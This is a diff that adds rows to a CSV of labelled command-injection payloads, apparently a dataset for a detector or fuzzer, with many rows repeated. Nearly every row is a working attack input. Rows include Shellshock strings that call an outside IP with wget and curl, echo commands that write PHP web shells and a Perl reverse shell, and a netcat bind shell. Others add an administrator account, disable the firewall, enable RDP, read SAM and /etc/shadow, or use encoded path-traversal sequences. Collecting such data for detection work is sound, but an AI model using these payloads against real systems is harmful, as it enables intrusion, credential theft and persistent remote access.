+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",CMDI
+() { 0; }; touch /tmp/blns.shellshock1.fail;,CMDI
+"() {<svg onload=""alert(1)""> {')' ""(</svg>"" {& }; echo -e ""header\x3axss",CMDI
+"{{ get_user_file(""/etc/hosts"") }}",CMDI
+"{{ get_user_file(""/etc/hosts"") }}",CMDI
+"{{ get_user_file(""/etc/hosts"") }}",CMDI
+"{{ get_user_file(""/etc/hosts"") }}",CMDI
+"{{ get_user_file(""/etc/passwd"") }}",CMDI
+"{{ get_user_file(""/etc/passwd"") }}",CMDI
+"{{ get_user_file(""/etc/passwd"") }}",CMDI
+"{{ get_user_file(""/etc/passwd"") }}",CMDI
+"{{ get_user_file(""C:\boot.ini"") }}",CMDI
+"{{ get_user_file(""C:\boot.ini"") }}",CMDI
+"{{ get_user_file(""C:\boot.ini"") }}",CMDI
+"{{ get_user_file(""C:\boot.ini"") }}",CMDI
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},CMDI
+{{4+4}},CMDI
+{{4+4}},CMDI
+{{4+4}},CMDI
+{{4+4}},CMDI
+{{4+8}},CMDI
+{{4+8}},CMDI
+{{4+8}},CMDI
+{{4+8}},CMDI
+{{person.name}},CMDI
+{{person.name}},CMDI
+{{person.name}},CMDI
+{{person.name}},CMDI
+{{person.secret}},CMDI
+{{person.secret}},CMDI
+{{person.secret}},CMDI
+{{person.secret}},CMDI
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",CMDI
+{${phpinfo()}},CMDI
+{${phpinfo()}},CMDI
+{${phpinfo()}},CMDI
+{${phpinfo()}},CMDI
+{${sleep(10)}},CMDI
+{${sleep(10)}},CMDI
+{${sleep(10)}},CMDI
+{${sleep(10)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(20)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(3)}},CMDI
+{${sleep(hexdec(dechex(20)))}},CMDI
+{${sleep(hexdec(dechex(20)))}},CMDI
+{${sleep(hexdec(dechex(20)))}},CMDI
+{${sleep(hexdec(dechex(20)))}},CMDI
+{${sleep(hexdec(dechex(20)))}} ,CMDI
+{${sleep(hexdec(dechex(20)))}} ,CMDI
+{1} + {1},CMDI
+{1} + {1},CMDI
+{1} + {1},CMDI
+{1} + {1},CMDI
+{cmd},CMDI
+{cmd}',CMDI
+"@{[system ""touch /tmp/blns.fail""]}",CMDI
+*; ls -lhtR /var/www/,CMDI
+*; ls -lhtR /var/www/,CMDI
+*; ls -lhtR /var/www/,CMDI
+*; ls -lhtR /var/www/,CMDI
+/.........................../../../../file',CMDI
+/...........................\\..\\..\\..\\file',CMDI
+/.../.../.../.../.../,CMDI
+/.../.../.../.../.../file',CMDI
+/../../../../../../../../../../../boot.ini,CMDI
+/../../../../../../../../../../../boot.ini%00,CMDI
+/../../../../../../../../../../../boot.ini%00.html,CMDI
+/../../../../../../../../../../../boot.ini%00.jpg,CMDI
+/../../../../../../../../../../../etc/passwd%00.html,CMDI
+/../../../../../../../../../../../etc/passwd%00.jpg,CMDI
+/../../../../../../../../../../etc/passwd,CMDI
+/../../../../../../../../../../etc/passwd^^,CMDI
+/../../../../../../../../../../etc/shadow,CMDI
+/../../../../../../../../../../etc/shadow^^,CMDI
+/../../../../../../../../%2A,CMDI
+/../../../../../../../../bin/id|,CMDI
+/../..//../..//file',CMDI
+/..//..//..//..//file',CMDI
+/..///..///..///..///file',CMDI
+/../etc/./passwd',CMDI
+/../etc/./passwd%00',CMDI
+/..\../..\../..\../..\../..\../..\../boot.ini,CMDI
+/..\../..\../..\../..\../..\../..\../etc/passwd,CMDI
+/..\../..\../..\../..\../..\../..\../etc/shadow,CMDI
+/..\\/..\\/..\\/..\\/..\\/..\\/..\\/file',CMDI
+/..\\/..\\file.txt',CMDI
+/..\\\\..\\\\..\\\\..\\\\file',CMDI
+/..\\\\\\..\\\\\\..\\\\\\file',CMDI
+/..%%32%66..%%32%66..%%32%66file.ini',CMDI
+/..%%35%63..%%35%63file',CMDI
+/..%252f..%252F..%252fetc/mtc',CMDI
+/..%255c..%255c..%255cboot.ini',CMDI
+/..%25c0%25af..%25c0%25affile',CMDI
+/..%2E/..%2E/..%2E/..%2E/..%2E/file',CMDI
+/..%2F..%2F..%2F..%2Fetc/mtc',CMDI
+/..%5c..%5C..%5Cfile',CMDI
+/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/dir%5C/file',CMDI
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,CMDI
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,CMDI
+/..%c1%9c..%c1%9c\\file',CMDI
+/./.././.././../file',CMDI
+/././././././././././././file',CMDI
+/./././././././././././boot.ini,CMDI
+/./././././././././././etc/passwd,CMDI
+/./././././././././././etc/shadow,CMDI
+/.//..//.//..//.//..//file',CMDI
+/.//././/././/./boot.ini',CMDI
+/./\\/././\\/./file',CMDI
+/.\\..\\.\\..\\.\\..\\file',CMDI
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,CMDI
+/.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\file',CMDI
+/.\\/\\.\\.\\/\\.\\file',CMDI
+/.\\\\..\\\\.\\\\..\\\\.\\..\\\\file',CMDI
+/%%32%65%%32%65\\%%32%65%%32%65\\file',CMDI
+/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66file.ini',CMDI
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63file',CMDI
+/%%32e%%32e%%32f%%32e%%32e%%32f%%32e%%32e%%32ffile',CMDI
+/%2%65%2%65%2%66%2%65%2%65%2%66%2%65%2%65%2%66file',CMDI
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,CMDI
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,CMDI
+/%252E%252E/%252E%252E/%252E%252E/etc/mtc',CMDI
+/%252E%252E\\%252E%252E\\%252E%252E\\file',CMDI
+/%252E%252E%252f%252E%252E%252f%252E%252E%252ffile',CMDI
+/%252E%252E%255c%252E%252E%255c%252E%252E%255cfile.ini',CMDI
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/file',CMDI
+/%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\file',CMDI
+/%25c0%25ae%25c0%25ae%25c0%25affile',CMDI
+/%25c0%25ae%25c0%25ae%c1%9c%25c0%25ae%25c0%25ae%c1%9cfile',CMDI
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,CMDI
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,CMDI
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,CMDI
+/%2E%2E/%2E%2E/%2E%2E/etc/mtc',CMDI
+/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fmtc',CMDI
+/%2e%2e%5c%2e%2e%5c%2e%2e%5cfile',CMDI
+/%c0%ae/WEB-INF/web.xml',CMDI
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/file',CMDI
+/%c0%ae%c0%ae\\%c0%ae%c0%ae\\file',CMDI
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%affile',CMDI
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cfile',CMDI
+/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002ffile',CMDI
+/dev/null; touch /tmp/blns.fail ; echo,CMDI
+/etc/hosts///////////',CMDI
+/etc/passwd/./././././.',CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/index.html|id|,CMDI
+/showcode.php/C:Windows/aaa.txt',CMDI
+/webapp/WEB-INF./web.xml',CMDI
+\..\..\..\..\..\..\..\..\..\..\boot.ini,CMDI
+\..\..\..\..\..\..\..\..\..\..\etc\passwd,CMDI
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,CMDI
+\..\..\..\..\..\..\..\..\..\..\etc\shadow,CMDI
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,CMDI
+\\../\\../\\../file',CMDI
+\\..\\..\\..\\..\\file',CMDI
+\\&apos;/bin/cat%20/etc/passwd\\&apos;,CMDI
+\\&apos;/bin/cat%20/etc/shadow\\&apos;,CMDI
+\n{cmd},CMDI
+\n{cmd}\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n,CMDI
+\n/bin/ls -al\n',CMDI
+\n/usr/bin/id;,CMDI
+\n/usr/bin/id;,CMDI
+\n/usr/bin/id;,CMDI
+\n/usr/bin/id;,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id\n,CMDI
+\n/usr/bin/id|,CMDI
+\n/usr/bin/id|,CMDI
+\n/usr/bin/id|,CMDI
+\n/usr/bin/id|,CMDI
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDI
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDI
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
+\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
+\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
+\necho INJECTX\nexit\n\033[2Asleep 5\n,CMDI
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid;,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid\n,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\nid|,CMDI
+\r,CMDI
+\r,CMDI
+\r,CMDI
+\r,CMDI
+\r\n,CMDI
+\r\n,CMDI
+\r\n,CMDI
+\r\n,CMDI
+& ,CMDI
+& ,CMDI
+& ,CMDI
+& curl http://crowdshield.com/.testing/rce.txt,CMDI
+& curl http://crowdshield.com/.testing/rce.txt,CMDI
+& curl http://crowdshield.com/.testing/rce.txt,CMDI
+& curl http://crowdshield.com/.testing/rce.txt,CMDI
+& dir,CMDI
+& dir,CMDI
+& dir,CMDI
+& dir,CMDI
+& dir C:\,CMDI
+& dir C:\,CMDI
+& dir C:\,CMDI
+& dir C:\,CMDI
+& dir C:\Documents and Settings\*,CMDI
+& dir C:\Documents and Settings\*,CMDI
+& dir C:\Documents and Settings\*,CMDI
+& dir C:\Documents and Settings\*,CMDI
+& dir C:\Users,CMDI
+& dir C:\Users,CMDI
+& dir C:\Users,CMDI
+& dir C:\Users,CMDI
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& id,CMDI
+& ifconfig,CMDI
+& ifconfig,CMDI
+& ifconfig,CMDI
+& ifconfig,CMDI
+& ipconfig /all,CMDI
+& ipconfig /all,CMDI
+& ipconfig /all,CMDI
+& ipconfig /all,CMDI
+& ls -l /,CMDI
+& ls -l /,CMDI
+& ls -l /,CMDI
+& ls -l /,CMDI
+& ls -l /etc/,CMDI
+& ls -l /etc/,CMDI
+& ls -l /etc/,CMDI
+& ls -l /etc/,CMDI
+& ls -l /home/*,CMDI
+& ls -l /home/*,CMDI
+& ls -l /home/*,CMDI
+& ls -l /home/*,CMDI
+& ls -l /tmp,CMDI
+& ls -l /tmp,CMDI
+& ls -l /tmp,CMDI
+& ls -l /tmp,CMDI
+& ls -l /var/www/*,CMDI
+& ls -l /var/www/*,CMDI
+& ls -l /var/www/*,CMDI
+& ls -l /var/www/*,CMDI
+& ls -laR /etc,CMDI
+& ls -laR /etc,CMDI
+& ls -laR /etc,CMDI
+& ls -laR /etc,CMDI
+& ls -laR /var/www,CMDI
+& ls -laR /var/www,CMDI
+& ls -laR /var/www,CMDI
+& ls -laR /var/www,CMDI
+& nc -lvvp 4444 -e /bin/sh&,CMDI
+& nc -lvvp 4444 -e /bin/sh&,CMDI
+& nc -lvvp 4444 -e /bin/sh&,CMDI
+& nc -lvvp 4444 -e /bin/sh&,CMDI
+& net localgroup Administrators hacker /ADD,CMDI
+& net localgroup Administrators hacker /ADD,CMDI
+& net localgroup Administrators hacker /ADD,CMDI
+& net localgroup Administrators hacker /ADD,CMDI
+& net user hacker Password1 /ADD,CMDI
+& net user hacker Password1 /ADD,CMDI
+& net user hacker Password1 /ADD,CMDI
+& net user hacker Password1 /ADD,CMDI
+& net view,CMDI
+& net view,CMDI
+& net view,CMDI
+& net view,CMDI
+& netsh firewall set opmode disable,CMDI
+& netsh firewall set opmode disable,CMDI
+& netsh firewall set opmode disable,CMDI
+& netsh firewall set opmode disable,CMDI
+& netstat -an,CMDI
+& netstat -an,CMDI
+& netstat -an,CMDI
+& netstat -an,CMDI
+"& perl -e 'print ""X""x16096'",CMDI
+"& perl -e 'print ""X""x16096'",CMDI
+"& perl -e 'print ""X""x16096'",CMDI
+"& perl -e 'print ""X""x16096'",CMDI
+"& perl -e 'print ""X""x2048'",CMDI
+"& perl -e 'print ""X""x2048'",CMDI
+"& perl -e 'print ""X""x2048'",CMDI
+"& perl -e 'print ""X""x2048'",CMDI
+"& perl -e 'print ""X""x4096'",CMDI
+"& perl -e 'print ""X""x4096'",CMDI
+"& perl -e 'print ""X""x4096'",CMDI
+"& perl -e 'print ""X""x4096'",CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &,CMDI
+& ping -i 30 127.0.0.1 &',CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+& ping -n 30 127.0.0.1 &,CMDI
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+& system('sleep 5');,CMDI
+& system('sleep 5');,CMDI
+& system('sleep 5');,CMDI
+& system('sleep 5');,CMDI
+& type %SYSTEMROOT%\repair\SAM,CMDI
+& type %SYSTEMROOT%\repair\SAM,CMDI
+& type %SYSTEMROOT%\repair\SAM,CMDI
+& type %SYSTEMROOT%\repair\SAM,CMDI
+& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+& type C:\Windows\repair\SAM,CMDI
+& type C:\Windows\repair\SAM,CMDI
+& type C:\Windows\repair\SAM,CMDI
+& type C:\Windows\repair\SAM,CMDI
+& type C:\Windows\repair\SYSTEM,CMDI
+& type C:\Windows\repair\SYSTEM,CMDI
+& type C:\Windows\repair\SYSTEM,CMDI
+& type C:\Windows\repair\SYSTEM,CMDI
+& type C:\WINNT\repair\SAM,CMDI
+& type C:\WINNT\repair\SAM,CMDI
+& type C:\WINNT\repair\SAM,CMDI
+& type C:\WINNT\repair\SAM,CMDI
+& uname -a,CMDI
+& uname -a,CMDI
+& uname -a,CMDI
+& uname -a,CMDI
+& wget http://crowdshield.com/.testing/rce.txt,CMDI
+& wget http://crowdshield.com/.testing/rce.txt,CMDI
+& wget http://crowdshield.com/.testing/rce.txt,CMDI
+& wget http://crowdshield.com/.testing/rce.txt,CMDI
+& whoami,CMDI
+& whoami,CMDI
+& whoami,CMDI
+& whoami,CMDI
+&{cmd},CMDI
+&{cmd}&,CMDI
+&& ,CMDI
+&& ,CMDI
+&& ,CMDI
+&& ,CMDI
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& dir C:\,CMDI
+&& dir C:\,CMDI
+&& dir C:\,CMDI
+&& dir C:\,CMDI
+&& dir C:\Documents and Settings\*,CMDI
+&& dir C:\Documents and Settings\*,CMDI
+&& dir C:\Documents and Settings\*,CMDI
+&& dir C:\Documents and Settings\*,CMDI
+&& dir C:\Users,CMDI
+&& dir C:\Users,CMDI
+&& dir C:\Users,CMDI
+&& dir C:\Users,CMDI
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",CMDI
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+&& ifconfig,CMDI
+&& ifconfig,CMDI
+&& ifconfig,CMDI
+&& ifconfig,CMDI
+&& ipconfig /all,CMDI
+&& ipconfig /all,CMDI
+&& ipconfig /all,CMDI
+&& ipconfig /all,CMDI
+&& ls -l /,CMDI
+&& ls -l /,CMDI
+&& ls -l /,CMDI
+&& ls -l /,CMDI
+&& ls -l /etc/,CMDI
+&& ls -l /etc/,CMDI
+&& ls -l /etc/,CMDI
+&& ls -l /etc/,CMDI
+&& ls -l /home/*,CMDI
+&& ls -l /home/*,CMDI
+&& ls -l /home/*,CMDI
+&& ls -l /home/*,CMDI
+&& ls -l /tmp,CMDI
+&& ls -l /tmp,CMDI
+&& ls -l /tmp,CMDI
+&& ls -l /tmp,CMDI
+&& ls -l /var/www/*,CMDI
+&& ls -l /var/www/*,CMDI
+&& ls -l /var/www/*,CMDI
+&& ls -l /var/www/*,CMDI
+&& ls -laR /etc,CMDI
+&& ls -laR /etc,CMDI
+&& ls -laR /etc,CMDI
+&& ls -laR /etc,CMDI
+&& ls -laR /var/www,CMDI
+&& ls -laR /var/www,CMDI
+&& ls -laR /var/www,CMDI
+&& ls -laR /var/www,CMDI
+&& nc -lvvp 4444 -e /bin/sh &,CMDI
+&& nc -lvvp 4444 -e /bin/sh &,CMDI
+&& nc -lvvp 4444 -e /bin/sh &,CMDI
+&& nc -lvvp 4444 -e /bin/sh &,CMDI
+&& net localgroup Administrators hacker /ADD,CMDI
+&& net localgroup Administrators hacker /ADD,CMDI
+&& net localgroup Administrators hacker /ADD,CMDI
+&& net localgroup Administrators hacker /ADD,CMDI
+&& net user hacker Password1 /ADD,CMDI
+&& net user hacker Password1 /ADD,CMDI
+&& net user hacker Password1 /ADD,CMDI
+&& net user hacker Password1 /ADD,CMDI
+&& net view,CMDI
+&& net view,CMDI
+&& net view,CMDI
+&& net view,CMDI
+&& netsh firewall set opmode disable,CMDI
+&& netsh firewall set opmode disable,CMDI
+&& netsh firewall set opmode disable,CMDI
+&& netsh firewall set opmode disable,CMDI
+&& netstat -an,CMDI
+&& netstat -an,CMDI
+&& netstat -an,CMDI
+&& netstat -an,CMDI
+"&& perl -e 'print ""X""x16096'",CMDI
+"&& perl -e 'print ""X""x16096'",CMDI
+"&& perl -e 'print ""X""x16096'",CMDI
+"&& perl -e 'print ""X""x16096'",CMDI
+"&& perl -e 'print ""X""x2048'",CMDI
+"&& perl -e 'print ""X""x2048'",CMDI
+"&& perl -e 'print ""X""x2048'",CMDI
+"&& perl -e 'print ""X""x2048'",CMDI
+"&& perl -e 'print ""X""x4096'",CMDI
+"&& perl -e 'print ""X""x4096'",CMDI
+"&& perl -e 'print ""X""x4096'",CMDI
+"&& perl -e 'print ""X""x4096'",CMDI
+"&& perl -e 'print ""X""x8096'",CMDI
+"&& perl -e 'print ""X""x8096'",CMDI
+"&& perl -e 'print ""X""x8096'",CMDI
+"&& perl -e 'print ""X""x8096'",CMDI
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
